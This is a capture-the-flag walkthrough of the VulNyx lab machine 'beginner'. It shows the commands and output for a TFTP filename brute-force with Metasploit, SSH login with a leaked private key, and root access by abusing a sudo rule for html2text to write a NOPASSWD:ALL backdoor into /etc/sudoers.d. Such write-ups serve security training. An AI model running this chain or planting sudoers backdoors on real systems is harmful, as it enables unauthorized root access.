# beginner

## Executive Summary

| Machine | Author | Category | Platform |
| :--- | :--- | :--- | :--- |
| beginner | d4t4s3c | Low | VulNyx |

**Summary:** The beginner machine lived up to its name, rewarding patient enumeration across both TCP and UDP protocols. The Apache site answered with a bare page signed by the IT Department, announcing that sensitive files had been exposed and needed to be removed, a thinly veiled invitation to keep digging. A UDP scan revealed the missing service: a TFTP daemon on port 69, tossing files at anyone who asked. The Metasploit module `auxiliary/scanner/tftp/tftpbrute` enumerated the share and found a file named `backup-config`, which a plain TFTP `get` pulled down as a zip archive. Unpacking it released two artifacts: a private SSH key and an `sshd_config` devoted to a user called `boris`, along with a `Match User` directive that disabled password authentication for his account. That explained the whole scheme: the administrator had deliberately restricted `boris` to key based login, and the backup had leaked the key intended for him. SSH with the stolen key opened a session as `boris`. The final step leaned on a `sudo` rule that let `boris` run `/usr/bin/html2text` as root. Since `html2text` accepts an output path, the attacker wrote a dropper file containing a `NOPASSWD:ALL` rule and instructed the tool to convert it directly into `/etc/sudoers.d`, quietly installing a permanent root backdoor before finishing with a `sudo -i`.

---

## Reconnaissance

The engagement opened with a host discovery sweep, followed by service scans.

1. The target was identified at `192.168.56.115`:

```bash
┌──(kali㉿kali)-[~/nyx]
└─$ nmap -sn 192.168.56.0/24              
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-13 09:26 -0400
Nmap scan report for 192.168.56.1 (192.168.56.1)
Host is up (0.00030s latency).
MAC Address: 0A:00:27:00:00:00 (Unknown)
Nmap scan report for 192.168.56.100 (192.168.56.100)
Host is up (0.0020s latency).
MAC Address: 08:00:27:BD:51:2B (Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.56.115 (192.168.56.115)
Host is up (0.0022s latency).
MAC Address: 08:00:27:7D:0F:C6 (Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.56.104 (192.168.56.104)
Host is up.
Nmap done: 256 IP addresses (4 hosts up) scanned in 2.02 seconds

┌──(kali㉿kali)-[~/nyx]
└─$ ip=192.168.56.115
```

2. A fast full port scan surfaced only two TCP services:

```bash
┌──(kali㉿kali)-[~/nyx]
└─$ nmap -p- -T4 --min-rate=1000 -Pn $ip  
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-13 09:26 -0400
Nmap scan report for 192.168.56.115 (192.168.56.115)
Host is up (0.00026s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:7D:0F:C6 (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 2.63 seconds
```

3. Version and script detection characterized both services:

```bash
┌──(kali㉿kali)-[~/nyx]
└─$ nmap -p 22,80 -sC -sV -T4 -Pn $ip 
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-13 09:29 -0400
Nmap scan report for 192.168.56.115 (192.168.56.115)
Host is up (0.00043s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 f0:e6:24:fb:9e:b0:7a:1a:bd:f7:b1:85:23:7f:b1:6f (RSA)
|   256 99:c8:74:31:45:10:58:b0:ce:cc:63:b4:7a:82:57:3d (ECDSA)
|_  256 60:da:3e:31:38:fa:b5:49:ab:48:c3:43:2c:9f:d1:32 (ED25519)
80/tcp open  http    Apache httpd 2.4.56 ((Debian))
|_http-server-header: Apache/2.4.56 (Debian)
|_http-title: Site doesn't have a title (text/html).
MAC Address: 08:00:27:7D:0F:C6 (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.76 seconds
```

4. The web page was fetched to see what the server presented:

```bash
┌──(kali㉿kali)-[~/nyx]
└─$ curl -s http://$ip/                    
<pre>
<b>Hello worker!

It has sensitive exposed files, fix it as soon as possible.










IT Department</b>
</pre>
```

The IT Department left a message confirming that sensitive files were exposed somewhere on the network, a direct hint that a forgotten service was leaking data.

5. Since the TCP surface was thin, a UDP scan was launched to look for services hiding behind connectionless transports:

```bash
┌──(kali㉿kali)-[~/nyx]
└─$ nmap -sU $ip                     
Nmap scan report for 192.168.56.115 (192.168.56.115)
Host is up (0.00085s latency).
Not shown: 998 closed udp ports (port-unreach)
PORT   STATE         SERVICE
68/udp open|filtered dhcpc
69/udp open|filtered tftp
MAC Address: 08:00:27:7D:0F:C6 (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 1086.17 seconds
```

The interesting result was port 69, the Trivial File Transfer Protocol. TFTP servers commonly expose files without authentication, which matched the IT Department's warning perfectly.

---

## Initial Access

### Leaking backup-config over TFTP

6. The Metasploit module `auxiliary/scanner/tftp/tftpbrute` is designed to brute force filenames on TFTP servers. Its documentation was used as a reference before launch:

```
https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/auxiliary/scanner/tftp/tftpbrute.md
```

7. The module was configured and run against the target:

```bash
┌──(kali㉿kali)-[~/nyx]
└─$ msfconsole -q                                                    
msf > use auxiliary/scanner/tftp/tftpbrute
msf auxiliary(scanner/tftp/tftpbrute) > set rhosts 192.168.56.115
rhosts => 192.168.56.115
msf auxiliary(scanner/tftp/tftpbrute) > set rport 69
rport => 69
msf auxiliary(scanner/tftp/tftpbrute) > run
[+] Found backup-config on 192.168.56.115
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf auxiliary(scanner/tftp/tftpbrute) > exit
```

The brute force hit a file named `backup-config`.

8. The file was downloaded directly with the TFTP client:

```bash
┌──(kali㉿kali)-[~/nyx]
└─$ tftp $ip          
tftp> get backup-config
tftp> quit
```

9. The downloaded file was an archive, as `file` revealed:

```bash
┌──(kali㉿kali)-[~/nyx]
└─$ file backup-config 
backup-config: Zip archive data, made by v3.0 UNIX, extract using at least v1.0, last modified Jul 24 2023 11:40:32, uncompressed size 0, method=store
```

10. It was renamed with a proper extension and unpacked:

```bash
┌──(kali㉿kali)-[~/nyx]
└─$ mv backup-config backup-config.zip

┌──(kali㉿kali)-[~/nyx]
└─$ unzip backup-config.zip -d backup-config     
Archive:  backup-config.zip
   creating: backup-config/backup/
  inflating: backup-config/backup/id_rsa  
  inflating: backup-config/backup/sshd_config  
```

The archive contained an SSH private key and an SSH server configuration.

### SSH Login as boris

11. The leaked `sshd_config` was inspected to understand how the key was meant to be used:

```bash
┌──(kali㉿kali)-[~/nyx/backup-config/backup]
└─$ chmod 600 id_rsa

┌──(kali㉿kali)-[~/nyx/backup-config/backup]
└─$ cat sshd_config 
#       $OpenBSD: sshd_config,v 1.103 2018/04/09 20:41:22 tj Exp $

...

Match User boris
    PasswordAuthentication no
```

The `Match User boris` block reported that password authentication was disabled for the user `boris`, confirming that the only way into his account was the leaked private key.

12. The key was used to establish an SSH session as `boris`:

```bash
┌──(kali㉿kali)-[~/nyx/backup-config/backup]
└─$ ssh -i id_rsa boris@$ip      
The authenticity of host '192.168.56.115 (192.168.56.115)' can't be established.
ED25519 key fingerprint is: SHA256:3dqq7f/jDEeGxYQnF2zHbpzEtjjY49/5PvV5/4MMqns
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:3: [hashed name]
    ~/.ssh/known_hosts:7: [hashed name]
    ~/.ssh/known_hosts:8: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.56.115' (ED25519) to the list of known hosts.
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
boris@beginner:~$ id;whoami;hostname
uid=1000(boris) gid=1000(boris) grupos=1000(boris)
boris
beginner
```

The leaked key worked, and a shell existed as `boris`.

---

## Privilege Escalation

### Root Through the html2text sudo Rule

13. Checking `sudo` privileges for `boris` revealed the escalation primitive:

```bash
boris@beginner:~$ sudo -l
Matching Defaults entries for boris on beginner:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User boris may run the following commands on beginner:
    (root) NOPASSWD: /usr/bin/html2text
```

The `html2text` utility converts HTML documents into plain text, and crucially it accepts an `-o` option to write its output to an arbitrary path. Running as root, that becomes a file write primitive.

14. A dropper containing a full `sudo` grant was written, then `html2text` was asked to convert it directly into the sudoers drop-in directory:

```bash
boris@beginner:~$ echo "boris ALL=(ALL) NOPASSWD: ALL" > /tmp/payload.html
boris@beginner:~$ sudo html2text -o /etc/sudoers.d/pwn /tmp/payload.html
```

`html2text` stripped the HTML tags and wrote the resulting line into `/etc/sudoers.d/pwn` as root, installing a valid sudoers rule.

15. The new privilege was confirmed, and a root shell was invoked:

```bash
boris@beginner:~$ sudo -l
Matching Defaults entries for boris on beginner:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User boris may run the following commands on beginner:
    (root) NOPASSWD: /usr/bin/html2text
    (ALL) NOPASSWD: ALL
boris@beginner:~$ sudo -i
root@beginner:~# id;whoami;hostname
uid=0(root) gid=0(root) grupos=0(root)
root
beginner
root@beginner:~# cat /home/boris/user.txt /root/r000000000000000000000000000000t.txt
```

With the `NOPASSWD: ALL` rule in place, `sudo -i` opened a root shell, and both the user flag and the unusually named root flag were read.

---

## Attack Chain Summary

1. **Reconnaissance**: A ping sweep isolated the target at `192.168.56.115`, and TCP scans exposed SSH on port 22 and Apache on port 80. The web page left a note claiming that sensitive files were exposed, and a UDP scan uncovered a TFTP server on port 69.

2. **Vulnerability Discovery**: The Metasploit TFTP brute force module enumerated the server and located a file named `backup-config`, which was downloaded directly over TFTP as a zip archive.

3. **Exploitation**: Unpacking the archive released a private SSH key and an `sshd_config` disabling password authentication for the user `boris`. The leaked key unlocked an SSH session as `boris`.

4. **Internal Enumeration**: A `sudo` policy allowed `boris` to run `/usr/bin/html2text` as root without a password, and the tool's `-o` option provided an arbitrary file write to any path.

5. **Privilege Escalation**: A dropper file containing a `NOPASSWD:ALL` sudo rule was converted by `html2text` directly into `/etc/sudoers.d`, after which `sudo -i` granted a root shell and both flags were recovered.